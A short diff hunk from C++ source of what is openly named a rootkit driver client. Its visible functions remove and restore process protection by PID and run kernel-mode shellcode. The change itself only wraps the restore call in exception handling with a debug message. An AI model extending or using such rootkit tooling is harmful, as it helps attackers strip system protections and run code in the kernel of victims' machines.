@@ -47,7 +47,12 @@ VOID RootkitDriver::RemoveProtectionFromProcess(ULONG Pid) {
 
 VOID RootkitDriver::RestoreProtectionToProcess(ULONG Pid) {
 	RestoreProtectionParams params = { Pid };
-	SendIoctl(IOCTL_RESTORE_PROTECTION, &params, sizeof(RestoreProtectionParams), nullptr, 0);
+	try {
+		SendIoctl(IOCTL_RESTORE_PROTECTION, &params, sizeof(RestoreProtectionParams), nullptr, 0);
+	}
+	catch (std::exception& exception) {
+		OutputDebugStringA("Process wasn't protected, continuing...\n");
+	}
 }
 
 DWORD RootkitDriver::RunKmShellcode(KM_SHELLCODE_ROUTINE Shellcode, size_t ShellcodeSize, const PVOID Input, size_t InputLength,
